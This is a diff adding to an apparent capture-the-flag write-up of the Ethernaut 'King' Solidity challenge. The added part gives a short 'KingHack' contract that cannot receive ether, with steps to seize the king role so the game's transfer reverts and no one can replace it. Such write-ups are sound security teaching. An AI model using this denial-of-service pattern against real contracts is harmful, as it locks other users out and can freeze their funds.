@@ -53,3 +53,20 @@ payable(king).transfer(msg.value);
 the line that sends ether to the previous `king`.
 From the [solidity docs](https://docs.soliditylang.org/en/v0.8.17/contracts.html?highlight=transfer#receive-ether-function), we know that ***if a contract has no `receive()` nor a payable `fallback()` function is present, the contract cannot receive Ether through regular transactions and throws an exception.***
 That means if the exception is thrown, the code after (where the new king and prize are set) will not be executed.
+
+Let's create a contract on [Remix IDE](https://remix.ethereum.org/):
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract KingHack {
+  // this contract has no receive() nor fallback() function so it can't receive ether back
+  function hack(address payable _to) public payable{
+    (bool sent, ) = _to.call{value: msg.value}(""); // send msg.value to the game instance
+    require(sent, "Ether not sent!");
+  }
+}
+```
+After deploying this contract, let's call `hack()` with a value of wei more or equal than `prize` and with the game instance as argument to claim `king`.
+
